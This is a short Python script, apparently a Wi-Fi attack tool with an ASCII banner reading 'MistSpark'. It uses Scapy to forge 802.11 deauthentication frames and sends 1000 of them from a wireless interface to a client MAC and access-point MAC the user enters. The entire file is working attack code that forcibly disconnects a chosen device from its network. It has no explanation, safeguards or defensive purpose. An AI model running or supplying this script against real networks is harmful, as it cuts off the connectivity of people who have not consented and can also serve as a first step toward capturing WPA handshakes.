#!/usr/bin/env python

'''
   *                  (
 (  `               ) )\ )                      ) 
 )\))(   (       ( /((()/(           )  (    ( /( 
((_)()\  )\  (   )\())/(_))`  )   ( /(  )(   )\())
(_()((_)((_) )\ (_))/(_))  /(/(   )(_))(()\ ((_)\ 
|  \/  | (_)((_)| |_ / __|((_)_\ ((_)_  ((_)| |(_)
| |\/| | | |(_-<|  _|\__ \| '_ \)/ _` || '_|| / / 
|_|  |_| |_|/__/ \__||___/| .__/ \__,_||_|  |_\_\ 
                          |_|
'''


import sys
from scapy.all import *

interface = "wlan2"

BSSID = raw_input("Enter the MAC of AP: ")
vic = raw_input("Enter The MAC OF Client: ")

frame = RadioTap()/Dot11(addr1=vic, addr2=BSSID, addr3=BSSID)/Dot11Deauth()

sendp(frame, iface=interface, count=1000, inter= .1)
